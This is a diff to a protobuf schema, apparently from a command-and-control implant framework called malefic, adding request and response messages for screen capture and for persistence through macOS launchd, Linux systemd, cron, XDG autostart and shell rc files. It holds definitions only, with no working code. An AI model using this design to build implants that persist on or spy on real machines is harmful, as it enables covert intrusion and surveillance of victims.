@@ -605,3 +605,106 @@ message BridgeLlmResponse {
   bytes data = 1;
   string error = 2;
 }
+
+// ---- Screenshot (cross-platform: scrap / CoreGraphics / X11) ----
+message ScreenshotRequest {
+  uint32 display = 1;        // display index, 0 = primary
+  string format = 2;         // "png" (default) | "jpeg"
+  uint32 quality = 3;        // jpeg quality 1-100, ignored for png
+  string save_path = 4;      // non-empty -> write file and return path; empty -> inline bytes
+  bool all_displays = 5;     // capture all displays
+}
+
+message ScreenshotResponse {
+  string path = 1;           // file path when save_path mode used
+  uint64 size = 2;
+  string checksum = 3;       // sha256 hex (malefic_sysinfo::filesys::check_sum_bytes)
+  uint32 width = 4;
+  uint32 height = 5;
+  bytes content = 6;         // encoded image bytes when save_path is empty
+}
+
+// ---- macOS LaunchAgent / LaunchDaemon persistence ----
+message LaunchdRequest {
+  string action = 1;         // "list" | "install" | "remove"
+  string label = 2;          // plist Label / unit name
+  string program = 3;        // executable path
+  string program_args = 4;   // args, space separated
+  bool run_at_load = 5;
+  uint32 start_interval = 6; // seconds, periodic trigger
+  bool keep_alive = 7;
+  bool as_daemon = 8;        // true = LaunchDaemon (root, /Library/LaunchDaemons); false = LaunchAgent (user, ~/Library/LaunchAgents)
+}
+
+message LaunchdEntry {
+  string label = 1;
+  string program = 2;
+  bool loaded = 3;
+  string path = 4;
+}
+
+message LaunchdsResponse {
+  repeated LaunchdEntry entries = 1;
+}
+
+// ---- Linux systemd persistence ----
+message SystemdRequest {
+  string action = 1;         // "list" | "install" | "remove" | "start" | "stop"
+  string name = 2;           // unit name (without .service suffix)
+  string exec = 3;           // ExecStart path
+  string args = 4;
+  bool as_system = 5;        // true = system (/etc/systemd/system, needs root); false = user (~/.config/systemd/user)
+  bool enable = 6;           // enable + start on install
+}
+
+message SystemdEntry {
+  string name = 1;
+  string exec = 2;
+  string state = 3;          // active/inactive/failed
+  bool enabled = 4;
+  string path = 5;
+}
+
+message SystemdsResponse {
+  repeated SystemdEntry entries = 1;
+}
+
+// ---- cron persistence (Linux + macOS) ----
+message CronRequest {
+  string action = 1;         // "list" | "install" | "remove"
+  string schedule = 2;       // 5-field cron expression, e.g. "* * * * *"
+  string command = 3;
+  string tag = 4;            // marker comment for locate on list/remove (e.g. "malefic:<tag>")
+  bool as_root = 5;          // true -> /etc/cron.d/<tag> (needs root); false -> user crontab
+}
+
+message CronEntry {
+  string schedule = 1;
+  string command = 2;
+  string user = 3;
+  string source = 4;         // "user" | "/etc/cron.d/<tag>"
+}
+
+message CronsResponse {
+  repeated CronEntry entries = 1;
+}
+
+// ---- autostart persistence (XDG / shell_rc, Linux + macOS) ----
+message AutostartRequest {
+  string action = 1;         // "list" | "install" | "remove"
+  string mechanism = 2;      // "xdg" | "shell_rc"
+  string name = 3;           // xdg: .desktop file name; shell_rc: marker tag
+  string command = 4;
+  string shell = 5;          // shell_rc mechanism: "bash" | "zsh" (which rc file to write)
+}
+
+message AutostartEntry {
+  string mechanism = 1;
+  string name = 2;
+  string command = 3;
+  string path = 4;
+}
+
+message AutostartsResponse {
+  repeated AutostartEntry entries = 1;
+}
